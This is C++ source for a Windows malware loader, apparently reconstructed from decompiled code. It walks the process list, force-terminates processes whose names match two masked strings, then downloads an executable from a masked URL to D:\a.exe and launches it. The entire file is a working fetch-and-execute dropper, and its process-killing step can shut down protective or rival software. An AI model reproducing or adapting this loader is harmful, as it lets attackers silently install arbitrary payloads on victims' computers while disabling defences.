// loader.cpp: 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <iostream>
#include <direct.h>
#include <urlmon.h>
#pragma comment(lib,"Urlmon.lib")

int main()
{
	HANDLE hProcess; // [sp+4Ch] [bp-130h]@6
	HANDLE hSnapshot; // [sp+50h] [bp-12Ch]@1
	PROCESSENTRY32 pe; // [sp+54h] [bp-128h]@1

	pe.dwSize = sizeof(pe);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		exit(0);
	if (Process32First(hSnapshot, &pe))
	{
		do
		{
			if (strstr(pe.szExeFile, "###############") || strstr(pe.szExeFile, "##############"))
			{
				hProcess = OpenProcess(0x1F0FFFu, 0, pe.th32ProcessID);
				if (hProcess)
					TerminateProcess(hProcess, 0);
			}
		} while (Process32Next(hSnapshot, &pe));
	}

	
	URLDownloadToFile(0, "##########################################", "D:\\a.exe", 0, 0);
	WinExec("D:\\a.exe", 5u);
	exit(0);

    return 0;
}

